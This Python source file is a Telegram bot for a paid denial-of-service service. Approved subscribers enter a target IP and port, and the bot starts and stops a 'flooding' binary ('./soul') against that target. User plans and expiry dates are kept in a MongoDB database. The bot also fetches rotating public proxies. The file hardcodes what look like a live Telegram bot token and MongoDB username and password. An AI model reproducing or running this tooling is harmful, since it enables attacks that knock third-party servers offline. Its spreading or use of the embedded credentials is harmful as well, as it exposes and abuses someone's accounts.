import telebot
import logging
import subprocess
import requests
import os
from pymongo import MongoClient
from datetime import datetime, timedelta
import certifi
from telebot.types import ReplyKeyboardMarkup, KeyboardButton
logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)
MONGO_URI = 'mongodb+srv://sharp:sharp@sharpx.x82gx.mongodb.net/?retryWrites=true&w=majority&appName=SharpX'
client = MongoClient(MONGO_URI, tlsCAFile=certifi.where())
TOKEN = '7841602486:AAGhwuAt-MGoIHDdJcqjdvH0UClcxg6DkAE'
CHANNEL_ID = -100 
ADMIN_IDS = [5850942601]

# Proxy related functions
proxy_api_url = 'https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http,socks4,socks5&timeout=500&country=all&ssl=all&anonymity=all'

proxy_iterator = None

def get_proxies():
    global proxy_iterator
    try:
        response = requests.get(proxy_api_url)
        if response.status_code == 200:
            proxies = response.text.splitlines()
            if proxies:
                proxy_iterator = itertools.cycle(proxies)
                return proxy_iterator
    except Exception as e:
        print(f"Error fetching proxies: {str(e)}")
    return None

def get_next_proxy():
    global proxy_iterator
    if proxy_iterator is None:
        proxy_iterator = get_proxies()
    return next(proxy_iterator, None)

def get_proxy_dict():
    proxy = get_next_proxy()
    return {"http": f"http://{proxy}", "https": f"http://{proxy}"} if proxy else None

db = client['sharp']
users_collection = db.users
bot = telebot.TeleBot(TOKEN)
blocked_ports = [8700, 20000, 443, 17500, 9031, 20002, 20001]
user_attack_details = {}
active_attacks = {}
def run_attack_command_sync(user_id, target_ip, target_port, action):

    try:
        if action == 1:
            process = subprocess.Popen(["./soul", target_ip, str(target_port), "1", "70"], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            active_attacks[(user_id, target_ip, target_port)] = process.pid
        elif action == 2:
            pid = active_attacks.pop((user_id, target_ip, target_port), None)
            if pid:
                subprocess.run(["kill", str(pid)], check=True)
    except Exception as e:
        logging.error(f"Error in run_attack_command_sync: {e}")
def is_user_admin(user_id, chat_id):
    try:
        chat_member = bot.get_chat_member(chat_id, user_id)
        return chat_member.status in ['administrator', 'creator'] or user_id in ADMIN_IDS
    except Exception as e:
        logging.error(f"Error checking admin status: {e}")
        return False

def check_user_approval(user_id):
    try:
        user_data = users_collection.find_one({"user_id": user_id})
        if user_data and user_data['plan'] > 0:
            valid_until = user_data.get('valid_until', "")
            return valid_until == "" or datetime.now().date() <= datetime.fromisoformat(valid_until).date()
        return False
    except Exception as e:
        logging.error(f"Error in checking user approval: {e}")
        return False


def send_not_approved_message(chat_id):
    bot.send_message(chat_id, "*YOU ARE NOT APPROVED*", parse_mode='Markdown')


def send_main_buttons(chat_id):
    markup = ReplyKeyboardMarkup(row_width=2, resize_keyboard=True, one_time_keyboard=True)
    markup.add(KeyboardButton("Flooding Attack"), KeyboardButton("Flooding Start🚀"), KeyboardButton("Flooding Stop"))
    bot.send_message(chat_id, "*Choose an action:*", reply_markup=markup, parse_mode='Markdown')
    

@bot.message_handler(commands=['add'])
def add_user(message):
    if not is_user_admin(message.from_user.id, message.chat.id):
        bot.send_message(message.chat.id, "*You are not authorized to use this command*", parse_mode='Markdown')
        return

    try:
        cmd_parts = message.text.split()
        if len(cmd_parts) != 4:
            bot.send_message(message.chat.id, "*Invalid command format. Use /add <user_id> <plan> <days>*", parse_mode='Markdown')
            return

        target_user_id = int(cmd_parts[1])
        plan = int(cmd_parts[2])
        days = int(cmd_parts[3])

        valid_until = (datetime.now() + timedelta(days=days)).date().isoformat() if days > 0 else ""
        users_collection.update_one(
            {"user_id": target_user_id},
            {"$set": {"plan": plan, "valid_until": valid_until, "access_count": 0}},
            upsert=True
        )
        bot.send_message(message.chat.id, f"*User {target_user_id} Added with plan {plan} for {days} days.*", parse_mode='Markdown')
    except Exception as e:
        bot.send_message(message.chat.id, "*FILL ALL CORRECT DETAILS *", parse_mode='Markdown')
        logging.error(f"Error in approving user: {e}")


@bot.message_handler(commands=['remove'])
def remove_user(message):
    if not is_user_admin(message.from_user.id, message.chat.id):
        bot.send_message(message.chat.id, "*You are not authorized to use this command*", parse_mode='Markdown')
        return

    try:
        cmd_parts = message.text.split()
        if len(cmd_parts) != 2:
            bot.send_message(message.chat.id, "*Invalid command format. Use /remove <user_id>*", parse_mode='Markdown')
            return

        target_user_id = int(cmd_parts[1])
        users_collection.update_one(
            {"user_id": target_user_id},
            {"$set": {"plan": 0, "valid_until": "", "access_count": 0}},
            upsert=True
        )
        bot.send_message(message.chat.id, f"*User {target_user_id} removed and reverted to free.*", parse_mode='Markdown')
    except Exception as e:
        bot.send_message(message.chat.id, "*FILL ALL CORRECT DETAILS *", parse_mode='Markdown')
        logging.error(f"Error in disapproving user: {e}")
@bot.message_handler(func=lambda message: message.text == "Flooding Attack")
def attack_button_handler(message):
    if not check_user_approval(message.from_user.id):
        send_not_approved_message(message.chat.id)
        return

    bot.send_message(message.chat.id, "*Please provide the target IP and port separated by a space.*", parse_mode='Markdown')
    bot.register_next_step_handler(message, process_attack_ip_port)
    
@bot.message_handler(commands=['Attack'])
def attack_command(message):
    if not check_user_approval(message.from_user.id):
        send_not_approved_message(message.chat.id)
        return

    bot.send_message(message.chat.id, "*Please provide the target IP and port separated by a space.*", parse_mode='Markdown')
    bot.register_next_step_handler(message, process_attack_ip_port)

def process_attack_ip_port(message):
    try:
        args = message.text.split()
        if len(args) != 2:
            bot.send_message(message.chat.id, "*Invalid format. Provide both target IP and port.*", parse_mode='Markdown')
            return

        target_ip, target_port = args[0], int(args[1])
        if target_port in blocked_ports:
            bot.send_message(message.chat.id, f"*Port {target_port} is blocked. Use another port.*", parse_mode='Markdown')
            return

        user_attack_details[message.from_user.id] = (target_ip, target_port)
        send_main_buttons(message.chat.id)
    except Exception as e:
        logging.error(f"Error in processing attack IP and port: {e}")
        bot.send_message(message.chat.id, "*Something went wrong. Please try again.*", parse_mode='Markdown')

@bot.message_handler(func=lambda message: message.text == "Flooding Start🚀")
def start_attack(message):
    attack_details = user_attack_details.get(message.from_user.id)
    if attack_details:
        target_ip, target_port = attack_details
        run_attack_command_sync(message.from_user.id, target_ip, target_port, 1)
        bot.send_message(message.chat.id, f"*Flooding Started parameters: {target_ip} Port: {target_port}*", parse_mode='Markdown')
    else:
        bot.send_message(message.chat.id, "*No target specified. Use /Attack to set it up.*", parse_mode='Markdown')

@bot.message_handler(func=lambda message: message.text == "Flooding Stop")
def stop_attack(message):
    attack_details = user_attack_details.get(message.from_user.id)
    if attack_details:
        target_ip, target_port = attack_details
        run_attack_command_sync(message.from_user.id, target_ip, target_port, 2)
        bot.send_message(message.chat.id, f"*Flooding Stopped parameters: {target_ip} Port: {target_port}*", parse_mode='Markdown')
        user_attack_details.pop(message.from_user.id, None)
    else:
        bot.send_message(message.chat.id, "*No active attack found to stop.*", parse_mode='Markdown')

@bot.message_handler(commands=['start'])
def start_command(message):
    send_main_buttons(message.chat.id)

if __name__ == "__main__":
    logging.info("Starting bot...")
    bot.polling(none_stop=True)



